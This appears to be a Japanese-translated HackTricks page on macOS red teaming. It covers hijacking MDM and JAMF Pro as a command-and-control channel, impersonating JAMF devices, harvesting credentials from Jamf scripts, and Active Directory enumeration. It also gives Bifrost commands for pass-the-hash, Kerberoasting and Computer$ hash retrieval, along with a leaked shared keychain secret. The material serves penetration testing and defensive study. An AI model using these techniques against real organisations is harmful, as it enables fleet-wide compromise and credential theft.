# macOS Red Teaming

{{#include ../../banners/hacktricks-training.md}}


## Abusing MDMs

- JAMF Pro: `jamf checkJSSConnection`
- Kandji

管理プラットフォームにアクセスするための **admin credentials を compromise** できた場合、マシンに malware を配布することで、**すべてのコンピューターを potentially compromise** できます。

MacOS 環境で red teaming を行うには、MDM の仕組みをある程度理解しておくことが強く推奨されます:


{{#ref}}
macos-mdm/
{{#endref}}

### Using MDM as a C2

MDM には、profiles の install、query、remove、applications の install、local admin accounts の作成、firmware password の設定、FileVault key の変更などを行う権限があります。

独自の MDM を実行するには、**CSR を vendor によって signed してもらう**必要があります。これは [**https://mdmcert.download/**](https://mdmcert.download/) で取得を試みることができます。また、Apple devices 用の独自の MDM を実行するには、[**MicroMDM**](https://github.com/micromdm/micromdm) を使用できます。

ただし、enrolled device に application を install するには、developer account による signed が依然として必要です。しかし、MDM enrolment の際に **device は MDM の SSL cert を trusted CA として追加する**ため、これであらゆるものに sign できるようになります。<sup>[4]</sup>

device を MDM に enrol するには、root として **`mobileconfig`** file を install する必要があります。これは **pkg** file 経由で配布できます（zip に compress しておけば、Safari から download した際に decompress されます）。

**Mythic agent Orthrus** はこの technique を使用します。

### Abusing JAMF PRO

JAMF は **custom scripts**（sysadmin が開発した scripts）、**native payloads**（local account の作成、EFI password の設定、file/process monitoring など）、および **MDM**（device configurations、device certificates など）を実行できます。<sup>[5]</sup>

#### JAMF self-enrolment

`https://<company-name>.jamfcloud.com/enroll/` のような page にアクセスし、**self-enrolment が enabled** かどうかを確認します。有効な場合、**access のための credentials を要求される**ことがあります。

[**JamfSniper.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfSniper.py) script を使用して password spraying attack を実行できます。

さらに、適切な credentials を見つけた後は、次の form を使用して他の usernames を brute-force できる可能性があります:

![Abusing JAMF PRO - JAMF self-enrolment: さらに、適切な credentials を見つけた後は、次の form を使用して他の usernames を brute-force できる可能性があります](<../../images/image (107).png>)

#### JAMF device Authentication

<figure><img src="../../images/image (167).png" alt=""><figcaption></figcaption></figure>

**`jamf`** binary には keychain を開くための secret が含まれており、発見当時は **全員で shared** されていて、その値は **`jk23ucnq91jfu9aj`** でした。<sup>[5]</sup>\
さらに、jamf は **LaunchDaemon** として **`/Library/LaunchAgents/com.jamf.management.agent.plist`** に **persist** します。

#### JAMF Device Takeover

**`jamf`** が使用する **JSS**（Jamf Software Server）の **URL** は、**`/Library/Preferences/com.jamfsoftware.jamf.plist`** にあります。\
この file には基本的に URL が含まれています:
```bash
plutil -convert xml1 -o - /Library/Preferences/com.jamfsoftware.jamf.plist

[...]
<key>is_virtual_machine</key>
<false/>
<key>jss_url</key>
<string>https://subdomain-company.jamfcloud.com/</string>
<key>last_management_framework_change_id</key>
<integer>4</integer>
[...]
```
そのため、攻撃者は悪意のあるパッケージ（`pkg`）を配置し、インストール時に **このファイルを上書き** して、**Typhon agent** からの Mythic C2 listener の **URL** を設定することで、JAMF を C2 として悪用できるようになります。
```bash
# After changing the URL you could wait for it to be reloaded or execute:
sudo jamf policy -id 0

# TODO: There is an ID, maybe it's possible to have the real jamf connection and another one to the C2
```
#### JAMF Impersonation

デバイスと JMF 間の**通信を impersonate**するには、以下が必要です。

- デバイスの **UUID**: `ioreg -d2 -c IOPlatformExpertDevice | awk -F" '/IOPlatformUUID/{print $(NF-1)}'`
- `/Library/Application\ Support/Jamf/JAMF.keychain` にある **JAMF keychain**。これにはデバイス証明書が含まれています。

この情報を使用して、**盗んだ** Hardware **UUID** を設定し、**SIP を無効化**した **VM を作成**し、**JAMF keychain** を配置して、Jamf **agent** を **hook**し、その情報を盗みます。

#### Secrets stealing

<figure><img src="../../images/image (1025).png" alt=""><figcaption><p>a</p></figcaption></figure>

また、`/Library/Application Support/Jamf/tmp/` の場所を監視することもできます。管理者が Jamf 経由で実行しようとする **custom scripts** は、ここに**配置され、実行され、削除される**ためです。これらのスクリプトには**認証情報が含まれている**可能性があります。

ただし、**認証情報**がこれらのスクリプトに**パラメータ**として渡される場合もあるため、`ps aux | grep -i jamf` を監視する必要があります（root でなくても可能です）。

[**JamfExplorer.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfExplorer.py) スクリプトは、新しいファイルの追加と新しいプロセス引数を listen できます。

### macOS Remote Access

また、**MacOS** の「特殊な」**network** **protocols**についても確認してください。


{{#ref}}
../macos-security-and-privilege-escalation/macos-protocols.md
{{#endref}}

## Active Directory

場合によっては、**MacOS コンピューターが AD に接続されている**ことがあります。このシナリオでは、普段どおりに Active Directory の **enumerate**を試みるべきです。以下のページに**help**があります。


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}


{{#ref}}
../../windows-hardening/active-directory-methodology/
{{#endref}}


{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/
{{#endref}}

役立つ可能性がある**ローカルの MacOS tool**として、`dscl`もあります。
```bash
dscl "/Active Directory/[Domain]/All Domains" ls /
```
また、MacOS向けに、ADを自動的に列挙し、Kerberosを操作するためのツールもいくつか用意されています。

- [**Machound**](https://github.com/XMCyber/MacHound): MacHoundは、Bloodhound auditing toolの拡張機能であり、MacOSホスト上のActive Directoryの関係を収集して取り込むことができます。<sup>[2]</sup>
- [**Bifrost**](https://github.com/its-a-feature/bifrost): Bifrostは、macOS上のHeimdal krb5 APIsと連携するために設計されたObjective-C projectです。このprojectの目的は、対象上で他のframeworkやpackagesを必要とせず、native APIsを使用してmacOS devices上のKerberosに対するsecurity testingを強化することです。
- [**Orchard**](https://github.com/its-a-feature/Orchard): Active Directory enumerationを実行するためのJavaScript for Automation (JXA) toolです。

### ドメイン情報
```bash
echo show com.apple.opendirectoryd.ActiveDirectory | scutil
```
### Users

MacOS のユーザーには、次の 3 種類があります。

- **Local Users** — ローカルの OpenDirectory service によって管理され、Active Directory には一切接続されていません。
- **Network Users** — 認証に DC server への接続を必要とする、一時的な Active Directory ユーザーです。
- **Mobile Users** — credentials と files のローカル backup を持つ Active Directory ユーザーです。

users と groups に関するローカル情報は、フォルダー _/var/db/dslocal/nodes/Default._ に保存されています。\
たとえば、_mark_ という user の情報は _/var/db/dslocal/nodes/Default/users/mark.plist_ に保存され、_admin_ group の情報は _/var/db/dslocal/nodes/Default/groups/admin.plist_ に保存されています。

HasSession および AdminTo edges に加えて、**MacHound は Bloodhound database に 3 つの新しい edges を追加します**:<sup>[2]</sup>

- **CanSSH** - host への SSH を許可された entity
- **CanVNC** - host への VNC を許可された entity
- **CanAE** - host 上で AppleEvent scripts を実行することを許可された entity
```bash
#User enumeration
dscl . ls /Users
dscl . read /Users/[username]
dscl "/Active Directory/TEST/All Domains" ls /Users
dscl "/Active Directory/TEST/All Domains" read /Users/[username]
dscacheutil -q user

#Computer enumeration
dscl "/Active Directory/TEST/All Domains" ls /Computers
dscl "/Active Directory/TEST/All Domains" read "/Computers/[compname]$"

#Group enumeration
dscl . ls /Groups
dscl . read "/Groups/[groupname]"
dscl "/Active Directory/TEST/All Domains" ls /Groups
dscl "/Active Directory/TEST/All Domains" read "/Groups/[groupname]"

#Domain Information
dsconfigad -show
```
詳細は [https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/](https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/) を参照してください。

### Computer$ パスワード

以下を使用してパスワードを取得します：
```bash
bifrost --action askhash --username [name] --password [password] --domain [domain]
```
**`Computer$`** の password は System keychain 内から access できます。

### Over-Pass-The-Hash

特定の user と service 用の TGT を取得します：
```bash
bifrost --action asktgt --username [user] --domain [domain.com] \
--hash [hash] --enctype [enctype] --keytab [/path/to/keytab]
```
TGTを取得したら、以下を使用して現在のセッションにinjectできます:
```bash
bifrost --action asktgt --username test_lab_admin \
--hash CF59D3256B62EE655F6430B0F80701EE05A0885B8B52E9C2480154AFA62E78 \
--enctype aes256 --domain test.lab.local
```
### Kerberoasting
```bash
bifrost --action asktgs --spn [service] --domain [domain.com] \
--username [user] --hash [hash] --enctype [enctype]
```
取得した service tickets を使えば、他のコンピューター上の共有へのアクセスを試みることが可能です。
```bash
smbutil view //computer.fqdn
mount -t smbfs //server/folder /local/mount/point
```
## Keychainへのアクセス

Keychainには、promptを表示させずにアクセスできれば、Red Team exerciseを前進させるのに役立つ機密情報が含まれている可能性が非常に高いです。


{{#ref}}
macos-keychain.md
{{#endref}}

## External Services

MacOS Red Teamingは通常のWindows Red Teamingとは異なり、**MacOSは複数の外部platformと直接統合されていることが多い**です。MacOSでよくある構成では、**OneLoginで同期されたcredentialsを使用してコンピューターにアクセスし、OneLogin経由で複数の外部サービス**（github、awsなど）にアクセスします。

## その他のRed Team techniques

### Safari

Safariでファイルをdownloadすると、それが「safe」なファイルの場合、**自動的に開かれます**。たとえば、**zipをdownloadすると**、自動的に解凍されます：

<figure><img src="../../images/image (226).png" alt=""><figcaption></figcaption></figure>

## References

- [1] [Gone Apple Pickin': 2021年のMacOS Environmentsに対するRed Teaming - Cedric Owens (DEF CON 29)](https://www.youtube.com/watch?v=IiMladUbL6E)
- [2] [MacHoundの紹介：macOS Active Directory Based AttacksへのSolution](https://medium.com/xm-cyber/introducing-machound-a-solution-to-macos-active-directory-based-attacks-2a425f0a22b6)
- [3] [its-a-feature - Domain Enumeration Commands (dscl / net / ldapsearch equivalents)](https://gist.github.com/its-a-feature/1a34f597fb30985a2742bb16116e74e0)
- [4] [Come to the Dark Side, We Have Apples: macOS Managementを悪用する](https://www.youtube.com/watch?v=pOQOh07eMxY)
- [5] [OBTS v3.0: 「An Attackers Perspective on Jamf Configurations」 - Luke Roberts / Calum Hall](https://www.youtube.com/watch?v=ju1IYWUv4ZA)


{{#include ../../banners/hacktricks-training.md}}
